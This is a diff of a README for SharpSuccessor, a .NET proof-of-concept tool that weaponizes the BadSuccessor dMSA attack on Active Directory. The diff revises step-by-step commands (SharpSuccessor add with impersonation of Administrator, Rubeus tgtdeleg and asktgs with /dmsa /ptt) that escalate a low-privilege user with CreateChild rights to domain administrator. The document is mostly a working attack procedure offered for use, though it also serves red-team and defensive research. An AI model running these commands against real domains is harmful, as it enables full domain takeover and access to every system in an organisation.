@@ -2,30 +2,25 @@
 
 SharpSuccessor is a .NET Proof of Concept (POC) for fully weaponizing Yuval Gordon’s ([@YuG0rd](https://x.com/YuG0rd)) [BadSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory) attack from Akamai. A low privilege user with `CreateChild` permissions over any Organizational Unit (OU) in the Active Directory domain can escalate privileges to domain administrator.
 
-From low-privilege user context, first create a computer object with a tool such as [Cable](https://github.com/logangoins/Cable):
+Use SharpSuccessor to add and weaponize the dMSA object, setting the account with access to the current user context:
 ```
-Cable.exe computer /add /name:attacker_computer /password:P@ssw0rd
+SharpSuccessor.exe add /impersonate:Administrator /path:"ou=test,dc=lab,dc=lan" /account:jdoe /name:attacker_dMSA
 ```
-![image](https://github.com/user-attachments/assets/7c2293bb-bbc3-46dd-bfbb-63b2a59e5766)
+![image](https://github.com/user-attachments/assets/adf814ad-3a67-4862-b01e-01cf42df0747)
 
-Then use SharpSuccessor to add and weaponize the dMSA object:
+Request a TGT as the current user context, in this case `jdoe`:
 ```
-SharpSuccessor.exe add /target:Administrator /path:"ou=test,dc=lab,dc=lan" /computer:attacker_computer$ /name:attacker_dMSA
+Rubeus.exe tgtdeleg /nowrap
 ```
-![image](https://github.com/user-attachments/assets/294efe2a-3fe0-496e-89e7-bff7e3ed8e36)
+![image](https://github.com/user-attachments/assets/90784c3d-0961-437a-9212-51c0accacad1)
 
-Finally use the previously created computer account to request a ticket as the dMSA. First requesting a TGT for the computer account:
-
-```
-Rubeus.exe asktgt /user:attacker_computer$ /password:P@ssw0rd /enctype:aes256 /opsec /nowrap
-```
-![image](https://github.com/user-attachments/assets/2adf8327-dcbd-4d7b-a781-e2a95946c8fb)
 
 Then use that tgt to impersonate the dMSA account:
 ```
-Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIF0DCCBcy...
+Rubeus.exe asktgs /targetuser:attacker_dmsa$ /service:krbtgt/lab.lan /opsec /dmsa /nowrap /ptt /ticket:doIFTDCCB.....
 ```
-![image](https://github.com/user-attachments/assets/7ee8cac1-70d3-40fb-85c3-740b86761ffb)
+![image](https://github.com/user-attachments/assets/7f642c89-7c87-4f48-bb60-a8d9be684912)
+
 
 Now you can request a service ticket with Administrator context for any SPN, including the Domain Controllers for post-exploitation. For example here I will show admin privileges for SMB on the domain controller:
 
